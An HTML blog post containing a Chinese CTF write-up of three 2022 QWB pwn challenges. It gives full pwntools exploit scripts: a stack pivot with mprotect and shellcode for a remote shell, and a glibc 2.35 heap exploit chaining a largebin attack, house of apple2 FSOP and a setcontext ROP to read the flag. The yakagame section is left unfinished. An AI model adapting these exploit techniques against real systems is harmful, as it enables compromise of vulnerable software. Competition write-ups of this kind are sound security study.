@@ -1,0 +1,564 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2022强网杯-PWN-WP | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2022强网杯-PWN-WP | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="devnull
+分析
+题目的libc_start_main需要glibc2.34+，所以在ubuntu21上打。
+main函数溢出点很明显，读了0x2c bytes，覆盖掉rbp后可以溢出0x8 bytes。
+
+直接考虑栈迁移。
+
+这里我是..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2022强网杯-PWN-WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-07-31
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="devnull">devnull</h1>
+<h2 id="分析">分析</h2>
+<p>题目的libc_start_main需要glibc2.34+，所以在ubuntu21上打。</p>
+<p>main函数溢出点很明显，读了0x2c bytes，覆盖掉rbp后可以溢出0x8 bytes。</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/31/2438410c865ac.png" alt="1659259085782.png" loading="lazy"></figure>
+<p>直接考虑栈迁移。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/31/9258eb4af205f.png" alt="1659259190674.png" loading="lazy"></figure>
+<p>这里我是迁移到.LOAD去了。</p>
+<p>溢出的时候要注意覆盖buf变量和fd变量（实际的栈布局和ida分析的稍有出入，需要自己调一下看），劫持第二次read，把之后布置的rop读到.LOAD中。</p>
+<p>这里进的是第25行的read，但是rdi此时是0，所以可以正常从stdin写数据。</p>
+<p>由于保护全开，不好从got表leak libc，但这个题存在<code>_mprotect</code>函数，可以用来修改某段内存的权限。</p>
+<p>在<code>sub_4012B6</code>中，存在可大量利用的代码片段</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/31/a71105e71c157.png" alt="1659259672300.png" loading="lazy"></figure>
+<p>由于之前打印过<code>Thanks\n</code>，刚好７个字符，所以在call _mprotect的时候，edx其实就是7。</p>
+<p>不过rdi是由rax控制的，所以还需要找能控制rax的gadget。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/31/8af09be747f44.png" alt="1659259468454.png" loading="lazy"></figure>
+<p>这里将<code>[rbp-0x18]</code>赋值给了rax，所以只需要控制好rbp，在gadget中，让<code>rbp-0x18</code>处是.LOAD的起始地址就行。（这里卡了挺久，mprotect的addr参数，必须是页对齐的才行）。</p>
+<p>然后就正常布置rop，最后写shellcode，execve(&quot;/bin/sh\x00&quot;, 0, 0)即可getshell。（由于关闭了stdout，所以getshell之后还需要<code>exec 1&gt;&amp;2</code>重定位一下）</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+context.arch = 'amd64'
+# p = process('./devnull')
+p = remote('123.56.45.155', 35339)
+elf = ELF('./devnull')
+
+load = 0x3fe000
+
+leave_ret = 0x0000000000401354 # leave ; ret
+mov_rax = 0x0000000000401350 # mov rax, qword ptr [rbp - 0x18] ; leave ; ret
+
+pay = cyclic(0x34) + p64(load)*2 + p64(leave_ret)
+p.recvuntil('filename')
+p.send(pay)
+
+pay = p64(load+0x28) + p64(mov_rax) + p64(load)*4 + p64(0x4012d0)
+pay += b'/bin/sh\x00' + p64(load+0x48)+asm(shellcraft.execve(load+0x38,0,0))
+
+p.recvuntil('new data')
+
+# gdb.attach(p)
+sleep(1)
+p.send(pay)
+
+p.interactive()
+
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/31/f3bf50cbed816.png" alt="1659260216178.png" loading="lazy"></figure>
+<h1 id="house-of-cat">house of cat</h1>
+<h2 id="分析-2">分析</h2>
+<p>libc-2.35的菜单堆题，保护全开，沙箱禁用了<code>execve</code>，并且对fd有检查。</p>
+<p>每次循环都用<code>sub_155E</code>对<code>tcache_perthread_struct</code>进行了重新赋值，防止打tcache任意分配。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/12/42ac03fff04ba.png" alt="1660290997606.png" loading="lazy"></figure>
+<p>分析<code>sub_1DF3</code>发现，需要先在<code>sub_1A50</code>中将<code>sub_19D6</code>栈上的一个变量改为1来登录，之后才能进到堆块管理的功能中。</p>
+<p>而登录的payload其实很简单:</p>
+<pre><code>1. 包含`QWB`, `LOGIN`, `QWXF`, `admin`, `r00t`这些字段
+2. 在`LOGIN`后用` | `隔开
+3. `LOGIN`最先出现, 然后是`r00t`, 在`QWB`往后5位是`admin`
+</code></pre>
+<p>我最终使用的是</p>
+<pre><code>LOGIN | r00t QWB QWXFadmin
+</code></pre>
+<p>后续的菜单交互payload构造方法类似，就不作具体分析了</p>
+<p>菜单总体如下</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/12/f5d9855063923.png" alt="1660294557739.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/12/067c8612a7210.png" alt="1660296472805.png" loading="lazy"></figure>
+<p>add功能限制了chunk的size在0x420到0x470之间，都是largebin chunks的范围。</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/12/32b9c86c4bbad.png" alt="1660296568387.png" loading="lazy"></figure>
+<p>delete直接白给uaf，肯定会从这里入手去leak和打largebin attack。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/12/f7b6f5fe08767.png" alt="1660296652790.png" loading="lazy"></figure>
+<p>show是直接write0x30个字节，不怕\x00的截断。</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/12/1a014a46b33c3.png" alt="1660296750135.png" loading="lazy"></figure>
+<p>mini_edit限制了修改只能修改0x30，且次数受<code>dword_4010</code>的限制，只能修改2次。也就是说，最多完成2次largebin attack。不过这题的洞是uaf，操作的空间还是比较大的。</p>
+<p>leak部分没什么好说的，直接利用uaf得到heapbase和libcbase。</p>
+<p>第一个largebin attack我打的是<code>stderr</code>，因为这题没有显式调用exit，也不能从main函数返回，所以没法走fsop，需要利用<code>__malloc_assert</code>，（参考<code>house of kiwi</code>的触发方法，这里就不详细介绍了）</p>
+<p>IO利用链这里我是使用的<code>house of apple2</code>的方法，利用<code>_IO_wfile_overflow</code>。（其实也可以利用<code>_IO_wfile_jumps_mmap</code>或<code>_IO_wfile_jumps_maybe_mmap</code>，不过可能需要浅浅调一下偏移）</p>
+<pre><code class="language-c">wint_t
+_IO_wfile_overflow (FILE *f, wint_t wch)
+{
+  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */
+    {
+      f-&gt;_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return WEOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)
+    {
+      /* Allocate a buffer if needed. */
+      if f-&gt;_wide_data-&gt;_IO_write_base == 0
+    {
+      _IO_wdoallocbuf (f); // 进此分支
+      // ......
+    }
+    }
+}
+</code></pre>
+<p>这里需要满足：</p>
+<ol>
+<li><code>(f-&gt;_flags &amp; _IO_NO_WRITES) == 0</code></li>
+<li><code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0</code></li>
+<li><code>(f-&gt;_wide_data-&gt;_IO_write_base == 0)</code></li>
+</ol>
+<p>在<code>_IO_wdoallocbuf</code>中，有</p>
+<pre><code class="language-c">void
+_IO_wdoallocbuf (FILE *fp)
+{
+  if (fp-&gt;_wide_data-&gt;_IO_buf_base)
+    return;
+  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))
+    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF) // 进此分支控制rip
+      return;
+  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,
+             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);
+}
+libc_hidden_def (_IO_wdoallocbuf)
+</code></pre>
+<p>这里需要满足：</p>
+<ol>
+<li><code>(fp-&gt;_wide_data-&gt;_IO_buf_base) == 0</code></li>
+<li><code>(fp-&gt;_flags &amp; _IO_UNBUFFERED) == 0</code></li>
+</ol>
+<p>然后就会调用<code>(wint_t)_IO_WDOALLOCATE (fp)</code>, 即<code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
+<p>综上，<code>fake_stderr</code>需要满足的条件如下：</p>
+<ol>
+<li>如果不需要直接getshell，那么<code>fp-&gt;_flags</code>设置为0即可（满足<code>~(0x2 | 0x8 | 0x800)</code>）</li>
+<li><code>fp-&gt;vtable</code>设为<code>_IO_wfile_jumps</code></li>
+<li><code>fp-&gt;_wide_data</code>设置为某个可控地址<code>A</code>，（<code>*(fp + 0xa0) = A</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_IO_write_base</code>设置为0，（<code>*(A + 0x18) = 0</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_IO_buf_base</code>设置为0，（<code>*(A + 0x30) = 0</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_wide_vtable</code>设置为可控地址<code>B</code>，（<code>*(A + 0Xe0) = B</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为想要劫持rip到的地址，（<code>*(B + 0x68) = rip</code>）</li>
+</ol>
+<p>由于还会调用<code>__xfprintf</code>，其中有一个<code>_IO_flockfile</code>的宏，还需要满足<code>fp-&gt;_lock</code>为一个可写地址。</p>
+<p>触发<code>__malloc_assert</code>这题应该至少有两个做法，一个是再利用一次largebin attack去打<code>&amp;topsize+7</code>，修改到topsize为某个堆地址的最低一字节（要保证大于<code>0x20</code>），还有一个就是构造heap overlap，直接修改到topsize。这里我使用的是后者，所以也节约了一次largebin attack。（所以这题应该也是可以用house of emma梭的，只是能不打TLS就别打hhh）</p>
+<p>构造overlap的方法就是造3个与top chunk紧邻的chunk，两个0x450（A, B），另一个作为防止直接于topchunk合并的gap（C），然后free掉A和B，重新分配为一个0x440（C）和一个0x460（D），这个时候就能改到之前的chunk B的chunk size，我们修改他为0x8c1，此时利用uaf，再次free掉chunk B，这个时候topchunk就合并上来了。然后free掉chunk D，重新申请就能改到topchunk的size。</p>
+<p>剩下的就没什么好说的了，就是要注意在open之前先close(0)，让open(&quot;flag&quot;, 0)分配到的fd为0，通过沙箱的检查，然后直接用libc的open会被kill掉，这里可以用syscall来调用。</p>
+<p>（exp比较难看，<code>SigreturnFrame</code>和<code>_wide_vtable</code>我是直接空间复用了，因为<code>_IO_WDOALLOCATE</code>劫持到rip的时候，rdx刚好在那个chunk的地址，所以就凑合着用了。）</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+elf = ELF('./house_of_cat')
+libc = elf.libc
+p = process('./house_of_cat')
+
+sla = lambda x,y : p.sendlineafter(x, y)
+sa  = lambda x,y : p.sendafter(x, y)
+sd  = lambda x   : p.send(x)
+sl  = lambda x   : p.sendline(x)
+rl  = lambda     :p.recvline()
+ru  = lambda x   : p.recvuntil(x)
+
+def choice(idx):
+	sa('~~~\n', 'CAT | r00t QWB QWXF$\xff')
+	sla('choice:', str(idx))
+
+def add(idx, size, content='ababab'):
+	choice(1)
+	sla('idx:', str(idx))
+	sla('size:', str(size))
+	if idx!=14:
+		sa('content:', content)
+
+def delete(idx):
+	choice(2)
+	sla('idx:', str(idx))
+
+def show(idx):
+	choice(3)
+	sla('idx', str(idx))
+
+def edit(idx, content):
+	choice(4)
+	sla('idx', str(idx))
+	sa('content:', content)
+
+def getshell():
+	sleep(0.1)
+	p.interactive()
+
+def main():
+	sa('~~~\n', 'LOGIN | r00t QWB QWXFadmin')
+	add(0, 0x420) # A
+	wide_data = p64(0)*4
+	add(15, 0x450) # gap
+	add(1, 0x418) # B
+	add(2, 0x450) # gap
+	delete(0)
+	add(3, 0x450)
+	show(0) # leak
+	ru('text:\n')
+	libcbase = u64(p.recv(8)) - 0x21a0d0
+	p.recv(8)
+	heapbase = u64(p.recv(8))&gt;&gt;12
+	print(hex(libcbase))
+	print(hex(heapbase))
+	stderr = libcbase + libc.symbols['stderr']
+	print(hex(stderr))
+	delete(1)
+	fake_stderr = p64(0)
+	fake_stderr = fake_stderr.ljust(0x78, b'\x00')
+	fake_stderr += p64((heapbase&lt;&lt;12)) # _lock
+	fake_stderr = fake_stderr.ljust(0x90, b'\x00')
+	fake_stderr += p64((heapbase&lt;&lt;12)+0x1c60) # _wide_data
+	fake_stderr = fake_stderr.ljust(0xc8, b'\x00')
+	fake_stderr += p64(libcbase + 0x2160c0) # _IO_wfile_jumps
+	add(5, 0x418, fake_stderr)
+	delete(5)
+	pay = p64(libcbase+0x21a0d0)*2
+	pay += p64((heapbase&lt;&lt;12)^0x290) + p64(stderr-0x20)
+	edit(0, pay)
+	# gdb.attach(p)
+	add(4, 0x450) # largebin attack stderr
+	setcontext = libcbase + libc.symbols['setcontext']
+	wide_data = p64(0) * 13
+	wide_data += p64(0)*2 + p64(0x20) # rdx
+	wide_data += p64(0)*2 + p64((heapbase&lt;&lt;12)+0x2158) # rsp
+	wide_data += p64(libcbase + 0x000000000002a3e5 + 1) # rip
+	wide_data = wide_data.ljust(0xd0, b'\x00')
+	wide_data += p64((heapbase&lt;&lt;12)+0x20c0) # wide_vtable_address
+	add(6, 0x450, wide_data) # AA
+	wide_vtable = p64(0)
+	wide_vtable = wide_vtable.ljust(0x58, b'\x00')
+	wide_vtable += p64(setcontext+61)
+	close = libcbase + libc.symbols['close']
+	# open =  libcbase + libc.symbols['open']
+	read =  libcbase + libc.symbols['read']
+	write = libcbase + libc.symbols['write']
+	syscall_ret = libcbase + 0x0000000000091396 # syscall ; ret
+	pop_rax = libcbase + 0x0000000000045eb0 #  pop rax ; ret
+	pop_rdi = libcbase + 0x000000000002a3e5 # pop rdi ; ret
+	pop_rsi = libcbase + 0x000000000002be51 # pop rsi ; ret
+	rop = b'flag\x00\x00\x00\x00' + p64(0)*4
+	rop += p64(pop_rdi) + p64(0) + p64(close)
+	rop += p64(pop_rdi) + p64((heapbase&lt;&lt;12)+0x2130)
+	pay += p64(pop_rax) + p64(2) + p64(syscall_ret)
+	rop += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64((heapbase&lt;&lt;12)+0x2140) + p64(read)
+	rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64((heapbase&lt;&lt;12)+0x2140) + p64(write)
+	add(7, 0x450, wide_vtable + rop) # BB
+	add(8, 0x450)
+	add(9, 0x450)
+	add(10, 0x450) # gap
+	delete(8)
+	delete(9)
+	add(11, 0x440)
+	pay = p64(0) + p64(0x460+0x461)
+	add(12, 0x460, pay)
+	delete(9)
+	delete(12)
+	pay = p64(0) + p64(0x50) # hijack topsize
+	add(13, 0x460, pay)
+	# gdb.attach(p, 'b *__malloc_assert')
+	# raw_input()
+	add(14, 0x450) # __malloc_assert
+	getshell()
+
+if __name__ == '__main__':
+	main()
+
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/14/975c8130c8899.png" alt="1660485670538.png" loading="lazy"></figure>
+<h1 id="yakagame">yakagame</h1>
+<h2 id="分析-3">分析</h2>
+<p>题目给了<code>opt-8</code>和<code>yaka.so</code>，显然是道llvm pass类的pwn题。（至于llvm pass是啥，我后面再单独出一篇文章讲讲吧）</p>
+<p>查一下<code>opt-8</code>的保护，可以看到差不多只开了NX，利用形式就很多了</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/30/5b078d66cad2c.png" alt="1661828154179.png" loading="lazy"></figure>
+<p><code>yaka.so</code>直接ida开始分析</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/30/9b71bdb2e1b11.png" alt="1661827232637.png" loading="lazy"></figure>
+<p>首先在虚函数表中找到他重写的<code>runOnFunction</code>函数（一般来说<code>runOnFunction</code>一定在虚函数表的最后），在这题就是<code>sub_C880</code>这个函数，跟进去分析。</p>
+<p>可以看到需要用gamestart函数作为主函数，然后调用一些特殊函数名来进行对应的游戏操作，最终通过fight打败boss取得分数。（具体功能这里就不浪费篇幅讨论了）</p>
+<p>分数达到<code>0x12345678</code>过后会有一个后门</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/09b5dfa683188.png" alt="1662099608138.png" loading="lazy"></figure>
+<p>在后门中可以直接执行<code>system(cmd)</code></p>
+<p>这个<code>cmd</code>的来源如下，</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/478eac56ce997.png" alt="1662105456396.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/8aba753e70717.png" alt="1662105510236.png" loading="lazy"></figure>
+<p>src长度为8，解密后极有可能是<code>cat flag</code>这8个字符。</p>
+<p>再看看涉及到解密的代码部分，</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/29d400de5ca3f.png" alt="1662105853650.png" loading="lazy"></figure>
+<p>当函数名为以上四个的时候，可以对<code>cmd</code>进行一个逐位的操作。</p>
+<p>现在来写代码暴力破解一下这个解密操作。</p>
+<p>先用idapython提取src的每一位（手动复制也行，我太懒了）</p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/3067a0c12b7ee.png" alt="1662106272161.png" loading="lazy"></figure>
+<p>写了个dfs暴力跑解密顺序，</p>
+<pre><code class="language-c++">#include&lt;cstdlib&gt;
+#include&lt;cstdio&gt;
+#include&lt;cstring&gt;
+#include&lt;iostream&gt;
+#define per(i, a, b) for (int i = a; i &lt;= b; ++i)
+#define rep(i, a, b) for (int i = a; i &gt;= b; --i)
+
+using namespace std;
+
+unsigned char cmd[1&lt;&lt;4] = {0x92, 0x68, 0x7b, 0x27, 0x6d, 0x93, 0x68, 0x66};
+int op[1&lt;&lt;10];
+void wuxiangdeyidao(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]^=0x14u;
+}
+void zhanjinniuza(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]^=0x7fu;
+}
+void guobapenhuo(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]-=9u;
+}
+void tiandongwanxiang(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]+=2u;
+}
+void (*func[1&lt;&lt;2])(unsigned char*) = {wuxiangdeyidao, zhanjinniuza, guobapenhuo, tiandongwanxiang};
+void dfs(unsigned char tmp[], int t){
+    if(t&gt;10)  return;
+    unsigned char tmp_t[1&lt;&lt;4] = {};
+    per(i,0,3){
+        memcpy(tmp_t, tmp, 0x9);
+        (*func[i])(tmp_t);
+        op[t] = i;
+        if(!strcmp((char *)tmp_t, &quot;cat flag&quot;)){
+            per(j,0,t)  cout&lt;&lt;op[j]&lt;&lt;&quot; &quot;;
+            exit(0);
+        }
+        else
+            dfs(tmp_t, t+1);
+    }
+}
+int main(){
+    unsigned char tmp[1&lt;&lt;4] = {};
+    memcpy(tmp, cmd, 0x9);
+    dfs(tmp, 0);
+    return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/1f574bbb34105.png" alt="1662108699227.png" loading="lazy"></figure>
+<p>最终得到的顺序是:</p>
+<pre><code>0 0 0 0 0 0 3 0 2 0
+</code></pre>
+<p>由于<code>wuxiangdeyidao</code>是异或操作，所以我可以对这个结果手动简化一下变成:</p>
+<pre><code>3 0 2 0
+</code></pre>
+<p>即，</p>
+<pre><code>tiandongwanxiang, wuxiangdeyidao, guobapenhuo, wuxiangdeyidao
+</code></pre>
+<p>这样就能把cmd还原为<code>cat flag</code>了</p>
+<p>现在来分析一下如何触发后门。</p>
+<p>在gamestart函数中调用特定函数，会触发特定的处理流程。<code>fight</code>, <code>merge</code>, <code>destroy</code>, <code>upgrade</code>和刚刚解密<code>cmd</code>分析到的四个函数以外，如果再遇到新的函数（这些函数的参数个数都要按照要求来定义），将会在map中存入新的键值对。</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/9149361b55bfa.png" alt="1662130301623.png" loading="lazy"></figure>
+<p>而<code>weaponlist</code>的索引<code>v33</code>是个char类型的变量，</p>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/6728d1fc3382d.png" alt="1662129601859.png" loading="lazy"></figure>
+<p>而bss段里面<code>weaponlist</code>的低位刚好又是<code>score</code>的指针，所以我们可以构造大于255个函数，让<code>v33</code>溢出为负数，且再次调用其中某些函数刚好能劫持到<code>score</code>指针的某几个字节（正好程序没有打开pie保护），从而让后门大开。</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/02/fffa6df5a3bdd.png" alt="1662129714788.png" loading="lazy"></figure>
+<p>由于map内部会对key进行排序，所以自定义函数的名字要注意按字典序递增。</p>
+<p>然后具体的偏移量要稍微用gdb调试一下。</p>
+<p>（待更新）</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#devnull">devnull</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+<li><a href="#house-of-cat">house of cat</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-2">分析</a></li>
+<li><a href="#exp-2">exp</a></li>
+</ul>
+</li>
+<li><a href="#yakagame">yakagame</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-3">分析</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/kernel pwn入门/">
+              <h3 class="post-title">
+                Kernel PWN BASIC
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
